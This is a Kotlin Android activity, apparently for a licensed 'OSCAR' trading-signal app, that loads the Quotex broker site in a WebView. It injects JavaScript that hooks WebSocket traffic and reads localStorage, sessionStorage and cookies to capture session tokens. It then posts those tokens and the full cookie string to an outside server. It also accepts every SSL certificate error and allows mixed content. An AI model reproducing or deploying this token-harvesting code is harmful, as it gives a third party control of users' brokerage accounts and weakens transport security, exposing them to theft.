package com.oscar.linker

import android.annotation.SuppressLint
import android.content.Context
import android.content.SharedPreferences
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.view.ViewGroup
import android.webkit.CookieManager
import android.webkit.JavascriptInterface
import android.webkit.WebResourceRequest
import android.webkit.WebView
import android.webkit.WebViewClient
import android.widget.EditText
import android.widget.LinearLayout
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.util.concurrent.TimeUnit

class MainActivity : AppCompatActivity() {

    private lateinit var webView: WebView
    private lateinit var statusText: TextView
    private lateinit var licenseKey: String
    private var sent = false
    private lateinit var prefs: SharedPreferences
    private var captureMode = false

    private val client = OkHttpClient.Builder()
        .connectTimeout(30, TimeUnit.SECONDS)
        .readTimeout(120, TimeUnit.SECONDS)
        .writeTimeout(120, TimeUnit.SECONDS)
        .build()

    private val BASE_URL = "https://signal-bott.onrender.com"
    private val SERVER_URL = "$BASE_URL/api/link"
    private val QX_DOMAIN = "https://quotex.com"

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        prefs = getSharedPreferences("oscar_prefs", Context.MODE_PRIVATE)

        val savedKey = prefs.getString("license_key", null)
        if (savedKey.isNullOrBlank()) {
            showKeyDialog()
        } else {
            licenseKey = savedKey
            setupUi()
            loadDashboard()
        }
    }

    private fun showKeyDialog() {
        val input = EditText(this).apply {
            hint = "OSCAR-XXXX-XXXX-XXXX"
            setSingleLine()
        }
        AlertDialog.Builder(this)
            .setTitle("🔑 أدخل مفتاح التفعيل")
            .setMessage("ضع مفتاح OSCAR الخاص بك ثم اضغط متابعة")
            .setView(input)
            .setCancelable(false)
            .setPositiveButton("متابعة") { _, _ ->
                val key = input.text.toString().trim().uppercase()
                if (key.isEmpty()) {
                    Toast.makeText(this, "المفتاح مطلوب", Toast.LENGTH_SHORT).show()
                    finish()
                } else {
                    licenseKey = key
                    prefs.edit().putString("license_key", key).apply()
                    setupUi()
                    loadDashboard()
                }
            }
            .setNegativeButton("إلغاء") { _, _ -> finish() }
            .show()
    }

    @SuppressLint("SetJavaScriptEnabled")
    private fun setupUi() {
        val root = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
        }
        statusText = TextView(this).apply {
            text = "جاري التحميل..."
            textSize = 13f
            setPadding(20, 20, 20, 20)
        }
        webView = WebView(this).apply {
            layoutParams = LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT,
                ViewGroup.LayoutParams.MATCH_PARENT
            )
        }
        root.addView(statusText)
        root.addView(webView)
        setContentView(root)
        configureWebView()
    }

    @SuppressLint("SetJavaScriptEnabled", "AddJavascriptInterface")
    private fun configureWebView() {
        webView.settings.apply {
            javaScriptEnabled = true
            domStorageEnabled = true
            databaseEnabled = true
            loadWithOverviewMode = true
            useWideViewPort = true
            mixedContentMode = android.webkit.WebSettings.MIXED_CONTENT_ALWAYS_ALLOW
            userAgentString = "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 " +
                    "(KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"
        }
        CookieManager.getInstance().setAcceptCookie(true)
        CookieManager.getInstance().setAcceptThirdPartyCookies(webView, true)
        webView.addJavascriptInterface(SessionBridge(), "OscarBridge")

        webView.webViewClient = object : WebViewClient() {
            override fun shouldOverrideUrlLoading(view: WebView, request: WebResourceRequest): Boolean {
                val url = request.url.toString()
                if (url.startsWith("oscar://connect")) {
                    startQuotexCapture()
                    return true
                }
                return false
            }

            override fun onReceivedSslError(view: WebView?, handler: android.webkit.SslErrorHandler?, error: android.net.http.SslError?) {
                handler?.proceed()
            }

            override fun onPageStarted(view: WebView?, url: String?, favicon: android.graphics.Bitmap?) {
                super.onPageStarted(view, url, favicon)
                if (url?.contains("quotex.com") == true) {
                    injectWebSocketInterceptor()
                }
            }

            override fun onPageFinished(view: WebView, url: String) {
                super.onPageFinished(view, url)
                if (url.contains("quotex.com")) {
                    injectWebSocketInterceptor()
                    if (url.contains("/trade") || url.contains("/cabinet") || url.contains("/dashboard") || url.contains("/ar/trade")) {
                        if (captureMode) {
                            statusText.text = "✅ تم اكتشاف تسجيل الدخول، جاري التقاط الجلسة..."
                            tryReadLocalStorage()
                            Handler(Looper.getMainLooper()).postDelayed({ tryCaptureFromCookies() }, 2000)
                        }
                    }
                } else if (url.contains("signal-bott.onrender.com")) {
                    statusText.text = "📊 لوحة التحكم"
                    captureMode = false
                }
            }
        }
    }

    private fun loadDashboard() {
        statusText.text = "📊 جاري فتح لوحة التحكم..."
        captureMode = false
        webView.loadUrl("$BASE_URL/app_login/$licenseKey")
    }

    private fun startQuotexCapture() {
        sent = false
        captureMode = true
        statusText.text = "📱 سجّل دخولك إلى Quotex..."
        webView.loadUrl("$QX_DOMAIN/ar/trade")
    }

    private fun tryCaptureFromCookies() {
        if (sent || !captureMode) return
        val cookies = CookieManager.getInstance().getCookie(QX_DOMAIN)
        if (cookies != null) {
            val ssid = extractCookie(cookies, "ssid")
                ?: extractCookie(cookies, "session")
                ?: extractCookie(cookies, "token")
            if (ssid != null && ssid.length > 20) {
                statusText.text = "🔗 جاري ربط حسابك بالسيرفر..."
                sendToServer(ssid, cookies)
            }
        }
    }

    private fun injectWebSocketInterceptor() {
        val js = """
            (function() {
                if (window.__oscarHooked) return;
                window.__oscarHooked = true;
                var OrigWS = window.WebSocket;
                var hookedWS = function(url, protocols) {
                    try {
                        var m = url.match(/[?&]token=([^&]+)/);
                        if (m && m[1] && m[1].length > 20) {
                            if (window.OscarBridge) window.OscarBridge.onSsid(m[1]);
                        }
                        var s = url.match(/[?&]session=([^&]+)/);
                        if (s && s[1] && s[1].length > 20) {
                            if (window.OscarBridge) window.OscarBridge.onSsid(s[1]);
                        }
                    } catch(e) {}
                    var ws = protocols ? new OrigWS(url, protocols) : new OrigWS(url);
                    try {
                        ws.addEventListener('message', function(ev) {
                            try {
                                var d = ev.data;
                                if (typeof d !== 'string') return;
                                var pats = [
                                    /"session"\s*:\s*"([^"]+)"/,
                                    /"token"\s*:\s*"([^"]+)"/,
                                    /"ssid"\s*:\s*"([^"]+)"/,
                                    /authorization["']?\s*[:=]\s*["']?([A-Za-z0-9_\-\.]{30,})/
                                ];
                                for (var i = 0; i < pats.length; i++) {
                                    var mm = d.match(pats[i]);
                                    if (mm && mm[1] && mm[1].length > 20) {
                                        if (window.OscarBridge) window.OscarBridge.onSsid(mm[1]);
                                        break;
                                    }
                                }
                            } catch(e) {}
                        });
                    } catch(e) {}
                    return ws;
                };
                hookedWS.prototype = OrigWS.prototype;
                hookedWS.CONNECTING = OrigWS.CONNECTING;
                hookedWS.OPEN = OrigWS.OPEN;
                hookedWS.CLOSING = OrigWS.CLOSING;
                hookedWS.CLOSED = OrigWS.CLOSED;
                window.WebSocket = hookedWS;
            })();
        """.trimIndent()
        webView.evaluateJavascript(js, null)
    }

    private fun tryReadLocalStorage() {
        val js = """
            (function() {
                try {
                    ['session','token','ssid','auth','authorization'].forEach(function(k) {
                        var v = localStorage.getItem(k);
                        if (v && v.length > 20) {
                            var p = v;
                            try { var o = JSON.parse(v); p = o.token || o.session || o.ssid || o.authorization || v; } catch(e) {}
                            if (window.OscarBridge) window.OscarBridge.onSsid(p);
                        }
                    });
                    ['session','token','ssid'].forEach(function(k) {
                        var v = sessionStorage.getItem(k);
                        if (v && v.length > 20 && window.OscarBridge) window.OscarBridge.onSsid(v);
                    });
                } catch (e) {}
            })();
        """.trimIndent()
        webView.evaluateJavascript(js, null)
    }

    inner class SessionBridge {
        @JavascriptInterface
        fun onSsid(ssid: String) {
            if (sent || !captureMode || ssid.length < 20) return
            sent = true
            runOnUiThread { statusText.text = "🔗 جاري ربط حسابك بالسيرفر..." }
            val cookies = CookieManager.getInstance().getCookie(QX_DOMAIN) ?: ""
            sendToServer(ssid, cookies)
        }

        @JavascriptInterface
        fun startConnect() {
            runOnUiThread { startQuotexCapture() }
        }

        @JavascriptInterface
        fun logout() {
            prefs.edit().remove("license_key").apply()
            runOnUiThread { recreate() }
        }
    }

    private fun extractCookie(cookies: String, name: String): String? {
        return cookies.split(";").map { it.trim() }.firstOrNull { it.startsWith("$name=") }?.substringAfter("=")
    }

    private fun sendToServer(ssid: String, cookies: String) {
        CoroutineScope(Dispatchers.IO).launch {
            try {
                val payload = JSONObject().apply {
                    put("license_key", licenseKey)
                    put("ssid", ssid)
                    put("cookies", cookies)
                    put("email", "")
                }
                val request = Request.Builder()
                    .url(SERVER_URL)
                    .post(payload.toString().toRequestBody("application/json".toMediaType()))
                    .build()
                val response = client.newCall(request).execute()
                val json = JSONObject(response.body?.string() ?: "{}")

                withContext(Dispatchers.Main) {
                    if (json.optBoolean("ok")) {
                        sent = false
                        captureMode = false
                        Toast.makeText(this@MainActivity, "✅ تم ربط الحساب بنجاح", Toast.LENGTH_LONG).show()
                        Handler(Looper.getMainLooper()).postDelayed({ loadDashboard() }, 500)
                    } else {
                        val err = json.optString("error", "خطأ غير معروف")
                        AlertDialog.Builder(this@MainActivity)
                            .setTitle("❌ فشل الربط")
                            .setMessage("السبب: $err\n\nتأكد من تسجيل الدخول وحاول مرة أخرى.")
                            .setCancelable(false)
                            .setPositiveButton("إعادة المحاولة") { _, _ -> sent = false; startQuotexCapture() }
                            .setNegativeButton("إلغاء") { _, _ -> sent = false; loadDashboard() }
                            .show()
                    }
                }
            } catch (e: Exception) {
                withContext(Dispatchers.Main) {
                    sent = false
                    Toast.makeText(this@MainActivity, "خطأ في الاتصال: ${e.message}", Toast.LENGTH_LONG).show()
                }
            }
        }
    }

    @Deprecated("Deprecated in Java")
    override fun onBackPressed() {
        if (::webView.isInitialized && webView.canGoBack()) webView.goBack() else super.onBackPressed()
    }
}
